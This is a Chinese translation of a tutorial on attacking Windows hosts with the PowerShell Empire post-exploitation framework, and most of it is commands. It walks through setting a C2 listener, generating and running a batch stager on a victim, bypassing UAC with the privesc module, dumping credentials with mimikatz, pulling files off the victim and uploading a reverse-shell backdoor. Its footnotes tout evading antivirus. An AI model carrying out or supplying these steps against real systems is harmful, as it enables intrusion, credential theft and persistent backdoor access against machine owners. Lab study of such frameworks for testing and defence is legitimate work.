## 使用Empire进行黑客攻击 - PowerShell后利用代理

### **Empire介绍 ** [^1]

**重要性 ** [^2]

### **术语**

- **监听器：**监听器是一个从我们正在攻击的机器上侦听连接的进程。这有助于帝国将战利品发回攻击者的计算机。
- **Stager：** stager是一段代码，允许我们的恶意代码通过受感染主机上的代理运行。
- **代理：**代理是一种程序，用于维护计算机与受感染主机之间的连接。
- **模块：**执行我们的恶意命令，这些命令可以收集凭据并升级我们的权限，如上所述。

### **安装**

`git clone https://github.com/EmpireProject/Empire.git`

```bash
cd Empire/
ls
cd setup/
ls
./install.sh
./reset.sh
```

`listeners`

`uselistener <tab> <tab>`

`uselistener http` [^3]

`info` [^4]

`set Name test` [^5]

`set Host http://192.168.1.107 & execute` [^6]

`back` [^7]

`usestager <tabt> <tab> `[^8]

`usestager windows/launcher_bat & info`

`set Listener test & execute` [^9]

`agents` [^10]

`rename ZAF3GT5W raajpc` [^11]

`interact raajpc` [^12]

**bypassuac http**[^13]

`rename HE3K45LN adminraj` [^14]

`list`

`interact adminraj`

`<tab> <tab>`  [^15]

`help`

`mimikatz` [^16]

```bash
# 使用UAC提权模块
interace A8Uxxxx
usemodule privesc/bypassuac
set Listener test
execute
```

### **creds** [^17]

`shell netstat -ano`

```bash
# 因为windows中的默认shell目录是“ C：/ windows / system32 ”; 让我们尝试移动到另一个目录并尝试从那里下载一些文件，我们也可以在该位置上传一些内容，例如，我们可以上传后门！
shell cd C:\Users\raj\Desktop
shell dir
download 6.png
upload /root/Desktop/revshell.php
# 下载文件的位置 Empire directory/downloads/<agent name>/<agent shell location>
# 例如: ~/Empire/downloads/admniraj/c:/Users/raj/Desktop/
```

`usemodule <tab> <tab>` [^18]

```bash
usemodule trollsploit/message
options
set MsgText you have been hacked
execute
y
```

[原文](https://www.hackingarticles.in/hacking-with-empire-powershell-post-exploitation-agent/)

---

[^1]: Empire是一个后开发框架。它是一个纯粹的PowerShell代理，专注于python，具有加密安全通信和灵活架构的附加功能。Empire具有在不需要PowerShell.exe的情况下执行PowerShell代理的方法。它可以迅速采用可后期利用的模块，涵盖范围广泛，从键盘记录器到mimikatz等。这个框架是PowerShell Empire和Python Empire项目的组合; 这使它用户友好和方便。PowerShell Empire于2015年问世，Python Empire于2016年问世。它类似于Metasploit和Meterpreter。但由于它是命令和控制工具，它允许您更有效地控制PC
[^2]: PowerShell提供了丰富的攻击性优势，进一步包括.NET的全部访问，applock白名单以及对Win32的直接访问。它还在内存中构建恶意二进制文件。它提供C2功能，允许您在第一阶段之后植入第二阶段。它也可以用于横向移动。随着它与其他框架相比发展迅速，它非常方便。此外，由于它不需要PowerShell.exe，它可以让您绕过反病毒。因此，最好使用PowerShell Empire
[^3]: 此命令在本地端口80上创建一个侦听器。如果端口80已经被像Apache这样的服务占用，请确保停止该服务，因为此侦听器是http侦听器只能在端口80上工作
[^4]: 查看所有设置
[^5]: 更改我们的监听器的名称，因为它有助于记住并批量所有被激活的监听器
[^6]: 通常，此侦听器会自动占用本地主机IP，但为了以防万一，您可以使用以下命令设置IP
[^7]: 从监听器接口返回，以便我们可以执行我们的模块
[^8]: 查看Empire提供的所有模块
[^9]: 在设置侦听器测试并创建`/tmp/launcher.bat`之后，上述两个命令将执行我们的漏洞利用。使用`python`服务器在受害者的PC中执行此文件。当文件将执行时，您将有一个会话
[^10]: 检查您的会话类型
[^11]: 使用上面的命令，您可以看到已激活会话。您可以更改会话的名称，因为默认情况下给出的名称非常复杂且难以记住
[^12]: 使用这个命令访问会话
[^13]: 获得对会话的访问权限后，请尝试使用以下命令获取管理会话
[^14]: 执行`bypassuac`命令后，将打开另一个会话。键入这个命令重命名该会话
[^15]: **<tab> <tab>**帮助我们查看shell中的所有选项。有几种选择对后期开发很有帮助。如信息，工作，列表等
[^16]: 我们尝试运行  **mimikatz**  来获取用户的密码。由于  **mimikatz**  不能在普通的guest用户shell上运行，并且只能在admin shell上运行; 这也证明我们必须实现管理员访问权限，以便我们可以使用mimikatz
[^17]: 用明文及其哈希格式转储任何用户的凭据或密码
[^18]: 该命令将显示所有可用模块并可供使用